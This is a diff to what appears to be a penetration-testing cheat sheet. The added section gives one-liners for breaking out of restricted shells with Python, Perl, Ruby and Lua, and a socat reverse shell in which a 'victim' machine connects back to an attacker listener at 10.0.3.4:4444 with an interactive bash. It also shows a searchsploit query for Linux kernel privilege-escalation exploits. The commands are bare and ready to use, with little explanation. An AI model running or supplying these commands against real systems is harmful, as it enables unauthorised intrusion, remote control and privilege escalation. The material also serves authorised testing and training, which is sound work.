@@ -437,12 +437,38 @@ Connection: close
 - service: all
 - tactics: enumeration
 
-## Full shell limited If commands are limited, you break out of the "jail" shell?
+## Full shell limited If commands are limited, you break out of the "jail" shell? shell upgrade, reverse shell limited, limited shell upgraded
  ( linux shell limited, powershell limited, reverse shell limited.
 - `python -c 'import pty;pty.spawn("/bin/bash")'`
 - `echo os.system('/bin/bash')`
 - `/bin/sh -i`
+/bin/sh -i
 
+ Python
+python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/bash")' 
+
+ Perl
+perl -e 'exec "/bin/sh";'
+perl -e 'exec "/bin/bash";'
+perl: exec "/bin/sh";
+
+ Ruby
+ruby: exec "/bin/sh"
+
+ Lua
+lua: os.execute('/bin/sh')
+
+ Socat
+ (Kali)
+socat file:`tty`,raw,echo=0 tcp-listen:4444  
+ (Victim)
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
+
+#or use socat binary to get a fully tty reverse shell
+socat file:`tty`,raw,echo=0 tcp-listen:12345
+
+```````````````
 # filter search for specific kernel versions
 - `searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6`
 
